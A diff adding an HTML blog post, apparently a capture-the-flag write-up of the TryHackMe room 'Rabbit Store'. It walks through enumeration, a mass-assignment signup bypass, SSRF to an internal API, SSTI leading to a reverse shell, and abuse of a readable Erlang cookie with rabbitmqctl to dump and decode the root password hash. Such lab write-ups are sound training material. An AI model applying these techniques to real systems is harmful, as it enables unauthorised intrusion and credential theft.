@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Rabbit Store :: northmatrix</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Overview Rabbit Store is a Medium ranked TryHackMe room focusing on privilege escalation and exploiting web vulnerabilities such as SSRF.
+Initial Enumeration First step was to run an nmap scan.
+root@ip-10-10-158-19:~/Room# nmap -sT -T5 -p10.10.57.245 Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-13 18:15 BST Nmap scan report for ip-10-10-57-245.eu-west-1.compute.internal (10.10.57.245) Host is up (0.00049s latency). Not shown: 65531 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 4369/tcp open epmd 25672/tcp open unknown MAC Address: 02:B8:99:FD:8B:E9 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 9.27 seconds Here we can see that a webserver is running on port 80 when visiting this in a browser we are redirected to cloudsite.thm which at the moment resolves to nothing. So we need to add it
+to our /etc/hosts. Note i also added storage.cloudsite.thm which appeard later while enumerating the websites webpages.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/2025-07-13-rabbit-store/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="//localhost:1313/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="northmatrix.github.io" />
+  
+    <meta name="twitter:creator" content="northmatrix" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Rabbit Store">
+<meta property="og:description" content="Overview Rabbit Store is a Medium ranked TryHackMe room focusing on privilege escalation and exploiting web vulnerabilities such as SSRF.
+Initial Enumeration First step was to run an nmap scan.
+root@ip-10-10-158-19:~/Room# nmap -sT -T5 -p10.10.57.245 Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-13 18:15 BST Nmap scan report for ip-10-10-57-245.eu-west-1.compute.internal (10.10.57.245) Host is up (0.00049s latency). Not shown: 65531 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 4369/tcp open epmd 25672/tcp open unknown MAC Address: 02:B8:99:FD:8B:E9 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 9.27 seconds Here we can see that a webserver is running on port 80 when visiting this in a browser we are redirected to cloudsite.thm which at the moment resolves to nothing. So we need to add it
+to our /etc/hosts. Note i also added storage.cloudsite.thm which appeard later while enumerating the websites webpages.
+" />
+<meta property="og:url" content="//localhost:1313/posts/2025-07-13-rabbit-store/" />
+<meta property="og:site_name" content="northmatrix" />
+
+  <meta property="og:image" content="//localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="tryhackme" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/syntax.css">
+</head>
+<body>
+
+
+<div class="container full">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Northmatrix
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/2025-07-13-rabbit-store/">Rabbit Store</a>
+  </h1>
+  <div class="post-meta"><span class="post-author">northmatrix</span><span class="post-reading-time">7 min read (1423 words)</span></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Rabbit Store is a Medium ranked TryHackMe room focusing on privilege escalation and exploiting web vulnerabilities such as SSRF.</p>
+<p><img src="Pasted%20image%2020250714002541.png" alt=""></p>
+<h2 id="initial-enumeration">Initial Enumeration<a href="#initial-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>First step was to run an nmap scan.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-158-19:~/Room# nmap -sT -T5 -p10.10.57.245
+</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-13 18:15 BST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> ip-10-10-57-245.eu-west-1.compute.internal <span class="o">(</span>10.10.57.245<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00049s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65531</span> closed ports
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh
+</span></span><span class="line"><span class="cl">80/tcp    open  http
+</span></span><span class="line"><span class="cl">4369/tcp  open  epmd
+</span></span><span class="line"><span class="cl">25672/tcp open  unknown
+</span></span><span class="line"><span class="cl">MAC Address: 02:B8:99:FD:8B:E9 <span class="o">(</span>Unknown<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.27 seconds
+</span></span></code></pre></div><p>Here we can see that a webserver is running on port 80 when visiting this in a browser we are redirected to cloudsite.thm which at the moment resolves to nothing. So we need to add it<br>
+to our <code>/etc/hosts</code>. Note i also added storage.cloudsite.thm which appeard later while enumerating the websites webpages.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">127.0.0.1       localhost
+</span></span><span class="line"><span class="cl">127.0.0.1       vnc.tryhackme.tech
+</span></span><span class="line"><span class="cl">127.0.1.1       tryhackme.lan   tryhackme
+</span></span><span class="line"><span class="cl">10.10.57.245    cloudsite.thm storage.cloudsite.thm
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
+</span></span><span class="line"><span class="cl">::1     localhost ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">ff02::1 ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2 ip6-allrouters
+</span></span></code></pre></div><p>After adding this and then revisiting the specified hostname i was then greeted with a webpage a for a &ldquo;Cloud Hosting Platform&rdquo;.</p>
+<p><img src="Pasted%20image%2020250713193127.png" alt=""></p>
+<h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Visiting the Resigtration/Login page i was able to create an account with email: <code>username@username.com</code> and password: <code>password</code>.</p>
+<p><img src="Pasted%20image%2020250713193557.png" alt=""></p>
+<p>After creating my account and logging in was greeted with a messaege incdicating that i dont have access to this service. In addition to this i noticed i now had a JWT stored in my cookies.</p>
+<p><img src="Pasted%20image%2020250713194028.png" alt=""></p>
+<p>Inspecting this JWT in <a href="https://jwt.io">https://jwt.io</a> showed that there was a key-value pair &ldquo;subscription&rdquo; set to &ldquo;inactive&rdquo;.</p>
+<p><img src="Pasted%20image%2020250713194153.png" alt=""></p>
+<p>I tried a few things at this point such as changing this value to &ldquo;active&rdquo; and then sending another request to the <code>/dashboard/active</code> to see if proper signature checks were in place … they where. At these point i began inspecting the signup request closer in burpsuite to see if there was somehow to change the subscription status.</p>
+<p><img src="Pasted%20image%2020250713194439.png" alt=""></p>
+<p>Here i tried adding the key-value pair &ldquo;subscription&rdquo; and setting it to &ldquo;active&rdquo; to see if i was able to exploit a Mass assignment vulnerability. Luckily this worked as i was nearly out of ideas.</p>
+<p><img src="Pasted%20image%2020250713194717.png" alt=""></p>
+<p>Upon login i was now instead greeted with a file upload form.</p>
+<p><img src="Pasted%20image%2020250713194918.png" alt=""></p>
+<p>At this point i tried uploading a reverse shell but noticed that the file extension was removed i later scrolled down and saw that they told me this. So at this point i decided to instead focus on the upload from URL form hoping to be able to exploit some kind of Local File Inclusion or SSRF vulnerability.</p>
+<p><img src="Pasted%20image%2020250713200548.png" alt=""></p>
+<p>After experimenting a bit with some URLS i found that if entering <a href="http://localhost:80">http://localhost:80</a> i was able to request the a webpage from the webserver running on localhost port 80 this was the same as the public-facing site but we have now confirmed the existence of a SSRF vulnerability. Now all we need to do is find a way to exploit this.</p>
+<p><img src="Pasted%20image%2020250713200628.png" alt=""></p>
+<p>My first idea here was to maybe view a page that i am not yet able to on the webserver but i had not yet found any so at this point i went back to directory scanning the website to see if there were any restricted areas. I first began enumerating the <code>http://storage.cloudsite.thm/api/</code> endpoint so what other endpoints there where.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-158-19:~/Room# gobuster dir -u storage.cloudsite.thm/api -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt  -e
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://storage.cloudsite.thm/api
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Expanded:                <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">http://storage.cloudsite.thm/api/Login                <span class="o">(</span>Status: 405<span class="o">)</span> <span class="o">[</span>Size: 36<span class="o">]</span>
+</span></span><span class="line"><span class="cl">http://storage.cloudsite.thm/api/docs                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 27<span class="o">]</span>
+</span></span><span class="line"><span class="cl">http://storage.cloudsite.thm/api/login                <span class="o">(</span>Status: 405<span class="o">)</span> <span class="o">[</span>Size: 36<span class="o">]</span>
+</span></span><span class="line"><span class="cl">http://storage.cloudsite.thm/api/register             <span class="o">(</span>Status: 405<span class="o">)</span> <span class="o">[</span>Size: 36<span class="o">]</span>
+</span></span><span class="line"><span class="cl">http://storage.cloudsite.thm/api/uploads              <span class="o">(</span>Status: 401<span class="o">)</span> <span class="o">[</span>Size: 32<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">20473</span> / <span class="m">20474</span> <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></div><p>Looking at this i saw that i already used the login, register and uploads endpoints but had not yet encountered the docs endpoint upon visiting this i was greeted with the below json response.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span><span class="s2">&#34;Access denied&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><p>Initially i tried passing the url <a href="http://localhost:80/api/docs">http://localhost:80/api/docs</a> but soon realised the api was not located here after looking back at previous requests made when signing up i noticed the X-Powered-By: Express header indicating that the api was creating using express js looking online i found that common pactice when using express js is to have it listen on port 3000 so i tried the same request this time on port 3000.</p>
+<p><img src="Pasted%20image%2020250713204041.png" alt=""></p>
+<p>This was a success and upon visiting the path of the uploaded file i was served the documentation of the api.</p>
+<pre tabindex="0"><code>Endpoints Perfectly Completed
+
+POST Requests:
+/api/register - For registering user
+/api/login - For loggin in the user
+/api/upload - For uploading files
+/api/store-url - For uploadion files via url
+/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.
+
+GET Requests:
+/api/uploads/filename - To view the uploaded files
+/dashboard/inactive - Dashboard for inactive user
+/dashboard/active - Dashboard for active user
+
+Note: All requests to this endpoint are sent in JSON format.
+</code></pre><p>Looking at this documentation the only endpoint i have not yet visited is the /fetch_messeges_from_chatbot additionally the developer note on this does indicate that it likely still has a few bugs as a matter of it still being under development. Sending a post request to this endpoint from my attacking machine returned an error: username parameter is required. upon adding the username to the json and resending the post request i got the following response.</p>
+<p><img src="Pasted%20image%2020250713210010.png" alt=""></p>
+<p>Here we can see that a html page is returned with a message in <code>&lt;h1&gt;</code> tags telling us the chatbot is under developmnet. To test for Server-Side Template Injection (SSTI) I passed <code>{% raw %}{{4*4}}{% endraw %}</code> in the input this returned 16 which confirms that this templating engine is vulnerable.</p>
+<p><img src="Pasted%20image%2020250713210412.png" alt=""></p>
+<p>Using the below username we are able to get Remote Code Execution now all we need to do is upload a small reverse shell command.</p>
+<p><img src="Pasted%20image%2020250713212120.png" alt=""></p>
+<p>I started running a netcat listener on port 1234 and i then sent the following request</p>
+<p><img src="Pasted%20image%2020250713212350.png" alt=""></p>
+<p>My listener then caught the reverse shell and i now a reverse shell connection to the server from here i stabalised my shell with usual commands. and eventually got the following setup.</p>
+<p><img src="Pasted%20image%2020250713212510.png" alt=""></p>
+<p>Upon visiting the home directory of the user i found the first flag.</p>
+<p><img src="Pasted%20image%2020250713212611.png" alt=""></p>
+<h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>The next step was to try and evelvate my privileges so i am able to read the root flag. First i ran <code>cat /etc/passwd</code> to see if there where any interesting user services,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">azrael@forge:/var/lib/rabbitmq$ cat /etc/passwd
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">colord:x:121:127:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gdm:x:123:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
+</span></span><span class="line"><span class="cl">rabbitmq:x:124:131:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
+</span></span></code></pre></div><p>Here i noticed the rabbitmq (not on most ctf machines so likely part of the privilege escalation process) user which is a user created by rabbitmq (a free and opensource software that supports AMQP 1.0 and MQTT 5.0 protocols and is used for decouping services) visiting the directoires where rabbitmq stores its data i saw the following.</p>
+<p><img src="Pasted%20image%2020250713220007.png" alt=""></p>
+<p>As you can see in the above the <code>.erlang.cookie</code> is world readable using this cookie we are able to authenticate with the rabbitmq node. In order to connect with the node we need to add the hostname of the target to our <code>/etc/hosts</code> this will allow us to connect to the node below we are connceting to the node and listing the users here we see 2 one that is a hint and one that is root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-158-19:/tmp# sudo sudo rabbitmqctl --erlang-cookie <span class="s2">&#34;JQkMAknSiSahN5zb&#34;</span> --node rabbit@forge list_users
+</span></span><span class="line"><span class="cl">Listing users …
+</span></span><span class="line"><span class="cl">user	tags
+</span></span><span class="line"><span class="cl">The password <span class="k">for</span> the root user is the SHA-256 hashed value of the RabbitMQ root user<span class="s1">&#39;s password. Please don&#39;</span>t attempt to crack SHA-256.	<span class="o">[]</span>
+</span></span><span class="line"><span class="cl">root	<span class="o">[</span>administrator<span class="o">]</span>
+</span></span></code></pre></div><p>This below command exports the entire rabbitmq configuration including hashed passwords.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-158-19:/tmp# sudo sudo rabbitmqctl --erlang-cookie <span class="s2">&#34;JQkMAknSiSahN5zb&#34;</span> --node rabbit@forge export_definitions /tmp/definitions
+</span></span><span class="line"><span class="cl">Exporting definitions in JSON to a file at <span class="s2">&#34;/tmp/definitions&#34;</span> …
+</span></span></code></pre></div><p>This is the previous commands output.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-158-19:/tmp# cat definitions 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;bindings&#34;</span>:<span class="o">[]</span>,<span class="s2">&#34;exchanges&#34;</span>:<span class="o">[]</span>,<span class="s2">&#34;global_parameters&#34;</span>:<span class="o">[{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;cluster_name&#34;</span>,<span class="s2">&#34;value&#34;</span>:<span class="s2">&#34;rabbit@forge&#34;</span><span class="o">}]</span>,<span class="s2">&#34;parameters&#34;</span>:<span class="o">[]</span>,<span class="s2">&#34;permissions&#34;</span>:<span class="o">[{</span><span class="s2">&#34;configure&#34;</span>:<span class="s2">&#34;.*&#34;</span>,<span class="s2">&#34;read&#34;</span>:<span class="s2">&#34;.*&#34;</span>,<span class="s2">&#34;user&#34;</span>:<span class="s2">&#34;root&#34;</span>,<span class="s2">&#34;vhost&#34;</span>:<span class="s2">&#34;/&#34;</span>,<span class="s2">&#34;write&#34;</span>:<span class="s2">&#34;.*&#34;</span><span class="o">}]</span>,<span class="s2">&#34;policies&#34;</span>:<span class="o">[]</span>,<span class="s2">&#34;queues&#34;</span>:<span class="o">[{</span><span class="s2">&#34;arguments&#34;</span>:<span class="o">{}</span>,<span class="s2">&#34;auto_delete&#34;</span>:false,<span class="s2">&#34;durable&#34;</span>:true,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;tasks&#34;</span>,<span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;classic&#34;</span>,<span class="s2">&#34;vhost&#34;</span>:<span class="s2">&#34;/&#34;</span><span class="o">}]</span>,<span class="s2">&#34;rabbit_version&#34;</span>:<span class="s2">&#34;3.9.13&#34;</span>,<span class="s2">&#34;rabbitmq_version&#34;</span>:<span class="s2">&#34;3.9.13&#34;</span>,<span class="s2">&#34;topic_permissions&#34;</span>:<span class="o">[{</span><span class="s2">&#34;exchange&#34;</span>:<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;read&#34;</span>:<span class="s2">&#34;.*&#34;</span>,<span class="s2">&#34;user&#34;</span>:<span class="s2">&#34;root&#34;</span>,<span class="s2">&#34;vhost&#34;</span>:<span class="s2">&#34;/&#34;</span>,<span class="s2">&#34;write&#34;</span>:<span class="s2">&#34;.*&#34;</span><span class="o">}]</span>,<span class="s2">&#34;users&#34;</span>:<span class="o">[{</span><span class="s2">&#34;hashing_algorithm&#34;</span>:<span class="s2">&#34;rabbit_password_hashing_sha256&#34;</span>,<span class="s2">&#34;limits&#34;</span>:<span class="o">{}</span>,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;The password for the root user is the SHA-256 hashed value of the RabbitMQ root user&#39;s password. Please don&#39;t attempt to crack SHA-256.&#34;</span>,<span class="s2">&#34;password_hash&#34;</span>:<span class="s2">&#34;vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K&#34;</span>,<span class="s2">&#34;tags&#34;</span>:<span class="o">[]}</span>,<span class="o">{</span><span class="s2">&#34;hashing_algorithm&#34;</span>:<span class="s2">&#34;rabbit_password_hashing_sha256&#34;</span>,<span class="s2">&#34;limits&#34;</span>:<span class="o">{}</span>,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;root&#34;</span>,<span class="s2">&#34;password_hash&#34;</span>:<span class="s2">&#34;49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF&#34;</span>,<span class="s2">&#34;tags&#34;</span>:<span class="o">[</span><span class="s2">&#34;administrator&#34;</span><span class="o">]}]</span>,<span class="s2">&#34;vhosts&#34;</span>:<span class="o">[{</span><span class="s2">&#34;limits&#34;</span>:<span class="o">[]</span>,<span class="s2">&#34;metadata&#34;</span>:<span class="o">{</span><span class="s2">&#34;description&#34;</span>:<span class="s2">&#34;Default virtual host&#34;</span>,<span class="s2">&#34;tags&#34;</span>:<span class="o">[]}</span>,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;/&#34;</span><span class="o">}]}</span>
+</span></span></code></pre></div><p>According to rabbitmq docs the the rabbitmq_password stored here is in the following format. where password is the same password used for the root account. where a salt is 4 bytes.</p>
+<pre tabindex="0"><code>rabbitmq_password = base64(salt + sha256(salt + password))
+</code></pre><p>We can then get the root password by converting from base64 then to hex and removing the first 4 bytes.</p>
+<p><img src="Pasted%20image%2020250714001744.png" alt=""></p>
+<p>The remaining <code>e3d7ba85295***************************************14811ed194f98073585</code> is the root password. After loggin in there is a root flag located in <code>/root/root.txt</code>.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/posts/2025-07-13-probe/" class="button inline prev">
+        &lt; [<span class="button__text">Probe</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/posts/2025-07-8-skynet/" class="button inline next">
+         [<span class="button__text">Skynet</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
